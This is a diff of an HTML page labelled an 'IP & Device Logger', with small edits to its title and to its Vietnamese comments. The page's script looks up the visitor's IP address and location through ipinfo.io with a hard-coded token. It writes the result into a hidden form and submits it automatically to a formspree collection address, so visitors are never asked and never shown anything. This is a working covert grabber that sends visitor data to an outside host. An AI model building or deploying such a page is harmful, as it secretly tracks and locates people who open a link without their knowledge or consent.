@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Log IP + Device Info</title>
+  <title>IP & Device Logger</title>
 </head>
 <body>
   <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
@@ -12,8 +12,8 @@
   <script>
     async function getInfo() {
       try {
-        // Gọi ipinfo.io – dịch vụ ổn định, không cần token (cho request đơn lẻ)
-        const res = await fetch('https://ipinfo.io/json?token=ce4f3e1e92a582'); // Token public miễn phí, có thể thay nếu muốn
+        // Gọi ipinfo.io để lấy thông tin IP + vị trí (token miễn phí)
+        const res = await fetch('https://ipinfo.io/json?token=ce4f3e1e92a582');
         const data = await res.json();
 
         const ip = data.ip || 'Unknown';
@@ -46,10 +46,11 @@
 🕒 Time: ${now}
         `.trim();
 
+        // Gán vào input hidden và gửi form
         document.getElementById('ipInfo').value = content;
         document.getElementById('ipForm').submit();
       } catch (error) {
-        console.error('Fetch IP info failed:', error);
+        console.error('Error fetching info:', error);
       }
     }
 
